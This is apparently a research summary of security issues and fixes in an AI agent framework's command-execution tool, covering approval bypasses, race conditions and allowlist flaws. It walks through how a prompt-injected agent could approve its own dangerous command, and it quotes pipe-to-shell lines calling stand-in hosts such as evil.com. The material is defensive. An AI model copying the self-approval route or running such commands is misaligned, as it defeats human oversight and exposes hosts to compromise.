# OpenClaw Exec Security Patterns - Research Findings

Research conducted: 2026-03-20  
Repository: [openclaw/openclaw](https://github.com/openclaw/openclaw)  
Focus: exec-related security issues and PRs

## Executive Summary

Analysis of the OpenClaw GitHub repository revealed 5 critical security patterns around the `exec` tool's command execution system. These patterns emerged from 20+ issues, 20+ PRs, and 7 security advisories published in March 2026. The core challenge: balancing AI agent autonomy with safe command execution across multiple execution contexts (sandbox, gateway, node hosts).

---

## Pattern 1: Configuration-Based Approval Bypass

**The Problem:** Multiple code paths failed to honor `tools.exec.security=full` and `tools.exec.ask=off` settings, causing commands to trigger approval flows even when explicitly configured for unrestricted execution.

### Key Issues & PRs

- **Issue #45963** - "exec bypasses approval flow when tools.exec.host is unset (default fallback)"
  - **Root cause:** When `tools.exec.host` was undefined, code treated default `"sandbox"` differently than explicit `host: "sandbox"`. The approval bypass guard checked `sandboxHostConfigured = defaults?.host === "sandbox"` which evaluated to `false` when host was undefined, skipping both the sandbox-unavailable error AND the gateway approval flow.
  - **Impact:** Commands executed on gateway host with ZERO permission checks when sandbox was unavailable and host config was unset
  - **Affected:** Fresh installs with default config (majority of users)
  
- **Issue #43279** - "Exec approval still triggers with security=full and ask=off (node/webchat)"
  - **Root cause:** Node-backed exec path only fetched exec-approvals.json when `hostAsk === 'on-miss' && hostSecurity === 'allowlist'`. With `security=full`, the node's policy was completely ignored.
  - **Impact:** Repeated manual approval interruptions despite "full trust" configuration
  
- **PR #46902** - "fix(exec): respect security/ask policy on node-backed exec path"
  - **Fix:** Always fetch node exec-approvals.json regardless of security level, apply proper policy resolution using `minSecurity()` and `maxAsk()`, use resolved policy in `requiresExecApproval()` check
  - **Testing:** Verified all combinations of security/ask settings work correctly

### Pattern Recognition

**Configuration precedence confusion:** Code had inconsistent logic for when to read config vs when to enforce it. Multiple paths treated "not configured" differently than "explicitly configured to default value."

**Defense:** Config validation at startup + unified policy resolution function that all exec paths must call before execution.

---

## Pattern 2: Self-Approval Attack Surface

**The Problem:** A compromised or prompt-injected agent could request approval for a dangerous command and immediately self-approve it on the same WebSocket connection, bypassing human oversight entirely.

### Key Issues & PRs

- **PR #48149** - "security: prevent requester self-approval in exec.approval.resolve"
  - **CVSS:** 8.5 High (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)
  - **Attack scenario:**
    1. Malicious agent on connection `conn-A` calls `exec.approval.request`
    2. Record stored with `requestedByConnId = "conn-A"`
    3. Same connection immediately calls `exec.approval.resolve { decision: "allow-once" }`
    4. Command executes with no human review
  - **Root cause:** `ExecApprovalRecord` captured `requestedByConnId` but `exec.approval.resolve` handler never validated it. Comment said *"Used to prevent other clients from replaying an approval id"* but no enforcement existed.
  - **Fix:** Added connId identity check in `exec.approval.resolve`:
    ```typescript
    if (
      snapshot?.requestedByConnId != null &&
      client?.connId != null &&
      client.connId === snapshot.requestedByConnId
    ) {
      respond(false, undefined, errorShape(
        ErrorCodes.INVALID_REQUEST,
        "requester cannot approve their own exec request"
      ));
      return;
    }
    ```

### Pattern Recognition

**Intent vs implementation gap:** Security-critical fields were captured but never validated. The system collected data needed for enforcement but didn't enforce.

**Defense:** Always validate authorization boundaries at approval resolution time. Different connections for request vs approval is fundamental to human-in-the-loop design.

---

## Pattern 3: Approval Integrity - TOCTOU & Display Mismatch

**The Problem:** What humans approved was not what actually executed - time-of-check-time-of-use race conditions and misleading approval UI displays.

### Key Security Advisories

- **GHSA-xf99-j42q-5w5p** - "Unbound interpreter commands bypass node-host approval integrity" (HIGH severity, CVSS 7.3)
  - **Vulnerability:** Node-host approvals could approve a benign local script, then execute different local code if the script changed between approval and execution
  - **Technical detail:** Approval flow treated interpreter/runtime commands as approval-backed even when it couldn't bind exactly one direct local script file
  - **CWE:** CWE-367 (TOCTOU Race Condition)
  - **Fixed:** 2026.3.11 - Now fails closed unless exactly one concrete local file operand can be bound
  
- **GHSA-rw39-5899-8mxp** - "Node-host approvals showed misleading shell payloads" (HIGH severity, CVSS 7.1)
  - **Vulnerability:** Approval UI displayed extracted payload like `jq --version` while execution ran wrapper argv like `./env sh -c 'jq --version'`
  - **Attack scenario:** Attacker places malicious wrapper binary, induces wrapper-shaped command, operator approves misleading text, different code executes
  - **Technical detail:** Wrapper resolution normalized executables by basename and extracted shell text for display, but execution preserved full wrapper argv
  - **CWE:** CWE-436 (Interpretation Conflict), CWE-863 (Incorrect Authorization)
  - **Fixed:** 2026.3.11 - Bind approvals to exact executed argv, keep extracted text only as secondary preview

### Pattern Recognition

**Display != Execution:** Multiple code paths showed humans simplified/extracted command text while executing the full complex argv. Classic confused deputy problem.

**Defense:** 
- Bind approvals to the exact argv that will execute, not derived/simplified versions
- For interpreter commands, require direct file binding before allowing approval-backed execution
- Fail closed when binding is ambiguous

---

## Pattern 4: Allowlist Pattern Matching Vulnerabilities

**The Problem:** Glob patterns and allowlist matching were too permissive, allowing unintended commands to pass through.

### Key Security Advisories

- **GHSA-f8r2-vg7x-gh8m** - "Exec approval allowlist patterns overmatched on POSIX paths" (MEDIUM severity)
  - **Vulnerability:** `matchesExecAllowlistPattern` normalized with lowercasing and compiled globs too broadly on POSIX. The `?` wildcard could match `/`, allowing matches to cross path segments.
  - **Impact:** Allowlist entries could permit commands/paths the operator didn't intend to approve
  - **Example:** Pattern `foo?bar` could match `foo/bar` crossing directory boundary
  - **CWE:** CWE-178 (Improper Case Sensitivity), CWE-625 (Permissive Regular Expression)
  - **Fixed:** 2026.3.11 - Respect intended path semantics, prevent slash-crossing, proper POSIX case handling

### Pattern Recognition

**Over-normalization:** Security checks that transform input too aggressively (lowercasing, glob expansion) can create bypass opportunities. Case-insensitive matching on case-sensitive filesystems is particularly dangerous.

**Defense:**
- Respect platform path semantics (case sensitivity, separators)
- Prevent wildcards from crossing security boundaries (path segments)
- Test allowlist patterns against adversarial inputs

---

## Pattern 5: Command Injection & Content-Level Threats

**The Problem:** Traditional allowlist/approval systems operate at command-name level but can't detect content-level threats like homograph attacks, pipe-to-shell patterns, or terminal injection.

### Key PRs

- **PR #45611** - "fix(security): replace exec() with execFile() and harden SSRF blocklist"
  - **Vulnerability:** Used `child_process.exec()` which interpolates into shell string, enabling command injection on crafted config file paths
  - **Fix:** Replace with `execFile()` which passes arguments as array with `shell: false`, eliminating injection surface
  - **SSRF hardening:** Added `metadata.azure.internal` to blocklist, defense-in-depth for cloud metadata endpoints
  
- **PR #41320** - "Security: add tirith pre-exec command scanning"
  - **Problem:** Existing security (allowlist + approval) can't detect sophisticated threats:
    - Homograph attacks: Cyrillic lookalikes in URLs (`аррӏе.com` vs `apple.com`)
    - Pipe-to-shell: `curl malicious.com | bash`, `wget | sh`, `python <(curl ...)`
    - Terminal injection: ANSI escapes, bidi overrides, zero-width characters
    - Shortened URLs hiding malicious destinations
  - **Solution:** Optional pre-exec scanning with [tirith](https://github.com/sheeki03/tirith)
    - 66 detection rules across 11 categories
    - Runs locally, no network calls, sub-millisecond overhead
    - Three outcomes: `allow` (exit 0), `warn` (exit 2 → approval UI), `block` (exit 1)
    - Fail-open by default (if not installed or timeout)
  - **Hook points:**
    - Gateway/sandbox: pre-dispatch (platform known)
    - Node: post-dispatch (platform from `nodeInfo`)
  - **Warn escalation:** On paths without approval mechanism (elevated bypass, sandbox), warn → block

### Pattern Recognition

**Command-name security insufficient:** Allowlists like `["git", "npm", "curl"]` say nothing about `curl https://evil.com | bash`. Content-level analysis requires semantic understanding of:
- Command structure (pipes, redirections, process substitution)
- URL/hostname safety (homographs, punycode, shortened URLs)
- Character encoding (Unicode attacks, ANSI escapes)

**Defense:**
- Use `execFile()` not `exec()` - never interpolate user data into shell strings
- Add optional content-level scanning for sophisticated threats
- Fail-open by default for tools, fail-closed for security gates
- Escalate warnings to blocks when no human approval path exists

---

## Common Themes Across All Patterns

### 1. **Multiple Execution Paths, Inconsistent Enforcement**
The exec tool has 3+ execution contexts (sandbox, gateway, node) and each evolved separate approval logic. Security bugs emerged from:
- Different code paths reading config differently
- Some paths checking policy, others not
- Node-specific logic that diverged from gateway logic

**Lesson:** Security-critical checks must be unified and mandatory. Every execution path should call the same policy resolution function.

### 2. **Default Fallbacks Create Gaps**
Issues #45963 and #43279 both involved "not configured" being treated differently than "explicitly configured to default." When `tools.exec.host` was undefined:
- Guard checked `defaults?.host === "sandbox"` → `false`
- Code fell through to execution without approval

**Lesson:** Treat "not configured" identically to "configured to default value" for security checks. Fail closed when configuration is ambiguous.

### 3. **Display Text != Execution Reality**
GHSA-rw39-5899-8mxp and GHSA-xf99-j42q-5w5p both involved showing humans simplified/extracted command text while executing something different.

**Lesson:** Bind approvals to the exact argv that will execute. If you can't show humans what will actually run, fail closed.

### 4. **Identity Boundaries Matter**
PR #48149 fixed self-approval attack by validating `requestedByConnId !== resolverConnId`. The infrastructure existed but wasn't enforced.

**Lesson:** Capture identity context early, validate it at authorization decision points. Same-connection approval defeats human-in-the-loop.

### 5. **Transformation Creates Attack Surface**
- Lowercasing paths on case-sensitive filesystems (GHSA-f8r2-vg7x-gh8m)
- Extracting shell payloads from wrapper commands (GHSA-rw39-5899-8mxp)
- Interpolating into shell strings instead of argv arrays (PR #45611)

**Lesson:** Minimize transformation of security-critical inputs. When you must transform (for display, matching), validate on the untransformed original.

---

## Remediation Strategies Observed

1. **Unified Policy Resolution:** PRs now standardize on calling one policy-resolution function that all exec paths must use
2. **Fail-Closed Defaults:** When binding is ambiguous or config is missing, deny execution rather than allowing
3. **Identity Validation:** Check `connId` boundaries at approval resolution time
4. **Exact Argv Binding:** Approve what will execute, not derived/simplified versions
5. **Content-Level Scanning:** Optional tirith integration for threats beyond command-name allowlists
6. **execFile() over exec():** Never interpolate user data into shell strings

---

## Timeline Context

All 7 security advisories were published March 12-14, 2026. The 20+ issues and PRs span March 2026, suggesting:
- Recent security audit or focused security sprint
- Coordinated disclosure of multiple related vulnerabilities
- Systematic review of exec tool across all execution contexts

Patches shipped in version 2026.3.11 for most advisories.

---

## Related Files & Code Locations

- `src/agents/bash-tools.exec.ts` - Main exec tool, gateway/sandbox path
- `src/agents/bash-tools.exec-host-node.ts` - Node-backed execution path
- `src/gateway/server-methods/exec-approval.ts` - Approval request/resolve handlers
- `src/security/exec-allowlist.ts` - Pattern matching (GHSA-f8r2-vg7x-gh8m)
- `src/security/command-security.ts` - tirith integration (PR #41320)

---

## Recommended Reading Order

1. **Issue #45963** - Configuration bypass via default fallback (clearest root cause)
2. **PR #48149** - Self-approval attack (classic authorization bug)
3. **GHSA-rw39-5899-8mxp** - Display mismatch advisory (approval integrity)
4. **PR #46902** - Node policy fix (shows full policy resolution solution)
5. **PR #41320** - tirith integration (content-level defense)

---

*Research compiled from openclaw/openclaw GitHub repository on 2026-03-20 using `gh` CLI.*
